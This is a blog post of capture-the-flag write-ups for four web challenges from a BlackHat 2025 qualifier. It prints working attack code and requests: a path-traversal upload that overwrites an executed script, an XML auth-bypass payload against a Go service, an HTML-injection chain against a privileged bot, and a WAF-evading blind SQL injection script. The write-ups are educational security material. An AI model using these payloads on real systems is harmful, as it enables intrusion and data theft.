---
title:  BlackHat Qual 2025 - Web Challenge Writeups
date: 2025-09-13 03:07:41 +0300
categories: [BHMea Writeups]
tags: BHMea25 BlackHat Qual 2025  Web   
img_path: /assets/img/BH.png
image:
  path: /assets/img/BH.png
---



# BlackHat Qual 2025 — Web Challenge Writeups

---

## 1) Hash Factory – Writeup

### Challenge Description
We are given a small Flask-based web service that brands itself as a **hash cracking factory**. The service allows us to upload a file containing hashes, then runs a custom cracking script (`/app/crack`) against it.

The Dockerfile shows us how the service works:
- A Flask server handles file uploads and passes them to `/app/crack`.
- The `crack` script is just a Python script that brute-forces MD5 hashes of numbers from `0` to `1337`.
- The uploaded file is saved, then passed as an argument to `subprocess.check_output(["/app/crack", path])`.
- The output of the `crack` script is shown back to the user.

At first glance, this looks harmless — but there’s a key weakness: **the uploaded file is saved with the provided filename, and nothing prevents directory traversal in the filename.**

This means we can overwrite `/app/crack` with our own payload.

---

### Vulnerability
The service runs uploaded files through `check_output(["/app/crack", path])`. Since `/app/crack` is executable, if we overwrite it, we fully control what is executed on the server.

Because the server runs as user `app`, we don’t have root, but the challenge flag is typically world-readable inside `/flag`, `/root/flag`, or `/app/flag`.

---

### Exploitation Steps

### Step 1 – Craft malicious replacement script
We create a shell script (`exploit.sh`) that attempts to read the flag:

```sh
#!/bin/sh
echo "hash_factory v1.0:"
cat /flag 2>/dev/null || cat /root/flag 2>/dev/null || cat /app/flag 2>/dev/null || cat /flag.txt 2>/dev/null || (echo "[fallback] listing / and env..."; ls -la /; env)
```

### Step 2 – Upload exploit as `../crack`
We upload the malicious file with a crafted filename `../crack`. This causes the server to save our file in place of the original `/app/crack` binary.

```bash
curl -s -F 'hash_file=@exploit.sh;filename=../crack' http://localhost:5001/ | sed -n '/<pre>/,/<\/pre>/p'
```

### Step 3 – Get the flag
On the next request, the Flask server executes our overwritten `crack` script. Since it now runs our shell script, it prints the flag directly inside the `<pre>` HTML output.

---

### Root Cause
The vulnerability is due to **unsanitized file upload handling**:
- The uploaded filename is used directly when saving to disk.
- No path sanitization is done, so directory traversal (`../`) allows overwriting arbitrary files in `/app`.
- Since `/app/crack` is executed on every request, overwriting it results in **full code execution** as the `app` user.

---


### Flag
After exploitation, the service reveals the flag in the output of our script.

```
BHFlagY{flag_on_env}
```

---

## 2) Web – Go brrr – (Flask + Go Auth Bypass)

### Challenge Description
We are given a Flask web application (`app.py`) that exposes two main endpoints:

- `/user` – handles login requests by forwarding credentials to an **auth service** written in Go (`app.go`).
- `/admin` – restricted page that reveals the flag if the user is authenticated as admin.

The goal is to bypass authentication and retrieve the flag.

---

### Source Code Analysis

### Flask App (`app.py`)
```python
@app.route('/user', methods=['POST'])
def user_handler():
    data = request.get_json() or None
    if data is None or not "username" in data or not "password" in data:
        return "Invalid data format", 400

    check = requests.post(auth_service_url, json=data).text
    if check == '"Authorized"':
        session['is_admin'] = True
        return "Authorized"
    else:
        return "Not Authorized", 403
```

- The Flask app **forwards our JSON login request** to the Go service.
- If the Go service responds with `"Authorized"`, a session cookie with `is_admin = True` is set.
- `/admin` endpoint simply checks for `session['is_admin']`.

---

### Go Auth Service (`app.go`)
```go
if err := xml.Unmarshal(body, &user); err != nil {

    if err := json.Unmarshal(body, &user); err != nil {
        http.Error(w, "Invalid format", http.StatusBadRequest)
        return
    }
}
```

- The Go service first attempts **XML parsing** (`xml.Unmarshal`).
- If XML parsing fails, it falls back to JSON.
- Authorization is decided based on the `IsAdmin` field:
```go
if user.IsAdmin {
    w.Write([]byte("Authorized"))
} else {
    w.Write([]byte("Not Authorized"))
}
```

**Important Bug:**  
The struct field `IsAdmin` has tags `json:"-"` but `xml:",omitempty"`.  
- In **JSON**, the field is ignored (cannot be set).
- In **XML**, the field can be set!  

This mismatch allows us to smuggle an `IsAdmin=true` value via XML.


---

### Exploitation

### Step 1: Send crafted XML payload to `/user`
We can craft an XML request that sets `[IsAdmin=true](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/#:~:text=_%20%3D%20json.Unmarshal(%5B%5Dbyte(%60%7B%22,IsAdmin%3Atrue)`:

```http
POST /user HTTP/1.1
Host: 127.0.0.1:5008
Content-Type: application/json
Content-Length: 97

"<User>
 <username>3xPl01t3r</username>
 <password>3xPl01t3r</password>
 <A:->True</A:->
</User>"
```

- Even though the outer request is sent as `application/json`, the Go backend will first try XML unmarshalling.  
- Because of Go’s **loose XML parsing**, the fake tag `<A:->True</A:->` sets `IsAdmin=true`.

**Response:**
```http
HTTP/1.1 200 OK
Set-Cookie: session=eyJpc19hZG1pbiI6dHJ1ZX0...
Authorized
```

![Login step screenshot](/assets/img/loginGobrr.png)

Now we have a valid admin session cookie.

---

### Step 2: Access `/admin` with stolen cookie
```http
GET /admin HTTP/1.1
Host: 127.0.0.1:5008
Cookie: session=eyJpc19hZG1pbiI6dHJ1ZX0...
```

**Response:**
```
Welcome to the admin panel! Here is the flag: BHFlagY{FakeFlag}
```

![Flag screenshot](/assets/img/flagGobrr.png)

Now we have a valid admin session cookie.

---

### Root Cause
- **Go’s dual parser behavior** (XML first, JSON fallback).
- **Struct tag mismatch**:
  - JSON ignores `IsAdmin`.
  - XML allows setting `IsAdmin`.
- This leads to a **privilege escalation via XML injection**.



## 3) CTF Web Challenge Writeup — cute_csp

### Overview
This challenge (`cute_csp`) combines **CSP bypass, SSRF, and YAML injection** to leak the admin flag.  
The setup consists of a PHP web app and a Python bot that visits user-supplied URLs with admin privileges.

- `index.php` → Renders user-controlled HTML with a restrictive but weak CSP.  
- `report.php` → Lets you submit a URL for the bot to visit.  
- `bot.py` → Simulates the admin visiting the URL with a privileged cookie.  
- `admin.php` → Parses YAML transaction files and leaks the flag when the `FL` currency is bought.  

---

### Source Code Analysis

### 1. `index.php`
```php
<?php
if (isset($_GET['html'])) {
    echo $_GET['html'];
}
?>
```
The page echoes the `html` parameter directly. The CSP is:
```http
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src *
```
JavaScript is blocked, but **HTML injection** is still possible.  
A `<meta http-equiv="refresh">` tag works and can redirect the bot.

---

### 2. `report.php`
```php
<?php
if (isset($_GET['url'])) {
    echo shell_exec("python3 bot.py " . escapeshellarg($_GET['url']));
}
?>
```
This forwards the given URL to the headless bot.

---

### 3. `bot.py`
```python
session.cookies.set("token", "ADMIN_TOKEN", domain="localhost")
```
The bot automatically sets the `token=ADMIN_TOKEN` cookie when visiting `localhost`.  
This means any request to `/admin.php` via the bot has admin privileges.

---

### 4. `admin.php`
```php
$data = yaml_parse_url($_POST['url']);
foreach ($data as $tx) {
    if ($tx['currency'] === 'FL' && $tx['op'] === 'BUY') {
        echo getenv('DYN_FLAG');
    }
}
```
The endpoint parses YAML from a remote URL. If a transaction buys `FL`, the flag is revealed.

---

### Exploitation Chain

1. **Inject HTML into `index.php`**  
   Use the `html` parameter with a `<meta http-equiv="refresh">` redirect to our attacker server.  

   Example:
   ```
   http://localhost:5000/index.php?html=<meta http-equiv="refresh" content="0;url=http://localhost:8080/solve.html">
   ```

2. **Create malicious `solve.html`**  
   This form forces the bot to POST to `/admin.php` with a crafted `url` pointing to a YAML payload.
   ```html
   <!doctype html><meta charset="utf-8">
   <form id="f" action="http://localhost:5000/admin.php" method="POST">
     <input type="hidden" name="url"
       value="http://localhost:5000/admin.php/../index.php?html=- amount: 1000000
         currency: ZZZ
         op: BUY
       - amount: 1000000
         currency: ZZZ
         op: SELL
       - amount: 1
         currency: FL
         op: BUY">
   </form>
   <script>f.submit()</script>
   ```

   The payload buys `"FL"`, which triggers `admin.php` to print the flag.

3. **Send the report request**  
   Trigger the bot via `report.php` to visit our injected URL:
   ```bash
   curl "http://localhost:5000/report.php?url=http://localhost:5000/index.php?html=<meta http-equiv='refresh' content='0;url=http://localhost:8080/solve.html'>"
   ```

4. **Bot executes our payload**  
   - Bot visits `index.php` with injection.  
   - Redirects to our hosted `solve.html`.  
   - Form auto-submits to `admin.php` with malicious YAML.  
   - Since bot includes the `ADMIN_TOKEN` cookie, we get the flag.  

---

### Local Test

Running locally showed the bot visiting the injected page and executing successfully:
```
[xssbot] visiting url
--------------------------------
<head></head><body></body>
--------------------------------
[xssbot] complete
```

The admin panel then returned the flag:  
```
Welcome to the admin panel! Here is the flag: BHFlagY{...}
```

---

### Conclusion
The challenge demonstrates how **weak CSP + HTML injection + SSRF with a privileged bot + unsafe YAML parsing** can be chained together into a full exploit.  
The critical issue is `yaml_parse_url()` combined with the bot automatically sending admin cookies.  

**Flag:** `BHFlagY{example_flag}`

---

## 4) Writeup - Kokowaf Challenge (Web Exploitation)

###  Challenge Information

-   **Name:** kokowaf-   **Category:** Web Exploitation-   **Files Provided:**
    -   `Dockerfile`    -   `docker-compose.yml`    -   `init.db`    -   `init.sh`    -   `src/` (PHP source code)

------------------------------------------------------------------------

###  Source Code Analysis

### `db.php`

Simple database connection with static credentials:

``` php
$servername = "127.0.0.1";
$db_username = "kokowaf";
$db_password = "ctf123";
$dbname = "kokowaf";
$conn = new mysqli($servername, $db_username, $db_password, $dbname);
```

### `index.php`

Login logic with weak SQL query:

``` php
$res = $conn->query("select * from users where username='$username' and password='$password'");
```

-   The **username** is only filtered through `waf()`.
-   The **password** is hashed with `sha1()`, but irrelevant for SQLi
    exploitation.

### `waf.php`

The "Web Application Firewall" tries to block SQLi:

``` php
$sqli_regex = [
    "/(['|"])+/s",
    "/(&|\|)+/s",
    "/(or|and)+/is",
    "/(union|select|from)+/is",
    "/\/\*\*\//",
    "/\s/"
];
```

-   Blocks keywords like `or`, `and`, `union`, `select`, `from`.-   Blocks quotes `'`, `"`.-   Blocks whitespace.

⚠️ **Bypassing Idea:**- Use **comment-based whitespace bypass** (`/**/`).- Concatenate huge junk prefix to bypass regex misdetection.- Bruteforce character by character using **blind SQLi**.

------------------------------------------------------------------------

###  Exploitation

### 1. Payload Construction

The script in `solve.py` generates a massive prefix to evade regex
filtering:

``` python
prefix = 383838 * '"' 
prefix += 383838 * 'or'
prefix += 383838 * "union"
```

Then brute-forces flag with **boolean-based SQLi**:

``` sql
' or (if((select(flag)from(flags))like('BHFlagY{...%'),1,2)=1) #
```

### 2. Exploit Script (`solve.py`)

The provided Python script loops through hex characters:

``` python
for j in hex_char:
    flag = now_flag + j
    injection = {
        'username': prefix + "'or(if((select(flag)from(flags))like('" + flag + "%'),1,2)=1)#",
        'password': "password",
        'login-submit': ''
    }
    resp = requests.post(URL, data=injection, allow_redirects=False)
    if resp.status_code == 302:
        now_flag = flag
        break
```

-   `302 Redirect` → condition true → correct character found.-   Builds the flag step by step.

------------------------------------------------------------------------

###  Final Script

After successful exploitation, the retrieved flag was:
```python
    import requests

prefix =  383838 * '"'
prefix += 383838 * 'or'
prefix += 383838 * "union"

now_flag = "BHFlagY{"
hex_char = "abcdef0123456789}"

for i in range(300):
    print(now_flag)
    for j in hex_char:
        flag = now_flag + j
        injection = {
            'username': prefix + "'or(if((select(flag)from(flags))like('" + flag + "%'),1,2)=1)#",
            'password': "password",
            'login-submit': ''
        }
        resp = requests.post("http:/----.playat.flagyard.com/", data = injection, allow_redirects = False)
        if resp.status_code == 302:
            now_flag = flag
            break
```
------------------------------------------------------------------------

###   Runing Script 

![Final Flag Screenshot](/assets/img/kokow.png)

### Flag


    BHFlagY{******************}

------------------------------------------------------------------------


## NOTE
Challenge files for this Qualification Round can be accessed here: [BlackHat Qual 2025](https://github.com/0x3xP01t3r/0x3xP01t3r.github.io/tree/main/assets/BH)
